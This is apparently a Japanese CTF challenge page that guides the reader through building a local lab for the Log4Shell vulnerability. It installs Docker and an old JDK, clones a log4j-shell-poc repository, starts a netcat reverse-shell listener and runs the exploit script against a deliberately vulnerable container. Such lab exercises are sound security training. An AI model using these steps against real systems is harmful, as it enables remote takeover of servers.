<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/water.css@2/out/dark.css">  

# システム制御を獲得しろ
> ペンテストを依頼された  
使用しているシステムライブラリとCVEコードを参照したところ、システムの制御を獲得できる脆弱性を発見した。  
検証の必要性がある。

この問題はWSLを除いた完全なLinux環境が必要です。  
もっとも簡単な方法は、[ここ](https://www.linuxvmimages.com/images/ubuntu-2004/#ubuntu-2004)から仮想ハードディスクイメージを取得することです。  

## Linux環境が整ったら以下を実行します。

dockerのインストールを行います。  
[コチラ](https://www.softek.co.jp/SID/support/sidfmvm/guide/install-docker-ubuntu1804.html)を参照すると更にわかりやすいでしょう

```bash
sudo apt update
```

```bash
sudo apt install \
    apt-transport-https \
    ca-certificates \
    curl \
    gnupg-agent \
    software-properties-common
```

```bash
sudo add-apt-repository \
    "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
    $(lsb_release -cs) \
    stable"
```

```bash
sudo apt update
```

```apt
sudo apt install docker-ce docker-ce-cli containerd.io
```

---

Terminalを開き必要なリソースをコピーします。


```bash
git clone https://github.com/NT25-CTF/log4j-shell-poc-ja
```

```bash
cd log4j-shell-poc-ja
```

```bash
pip install -r requirements.txt
```

[ここ](https://drive.google.com/file/d/1r8F3X2e2pCN5Iar62yG4M0H8HuBK_4by/view?usp=sharing)から`jdk-8u20-linux-x64.tar.gz`をダウンロードし、`log4j-shell-poc-ja`以下のディレクトリにコピーします。

`log4j-shell-poc-ja`ディレクトリに移動したら、
```bash
tar -xf jdk-8u20-linux-x64.tar.gz
```
を実行します。
```bash
./jdk1.8.0_20/bin/java -version
```
を実行し、

```bash
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```

が表示されれば問題ありません。

これで環境構築は終了です。

---
Terminalを別のウインドウで3つほど開いておきます。  

NetCat Listenerを起動
```bash
nc -lvnp 9001
```

Exploitを実行します。
```py
python3 poc.py --userip localhost --webport 8000 --lport 9001
```

脆弱なWebアプリケーションを含んだDockerfileを起動させます
```bash
sudo docker build -t log4j-shell-poc .
```
```bash
sudo docker run --network host log4j-shell-poc
```

[localhost](https://localhost:8080)にアクセスしましょう!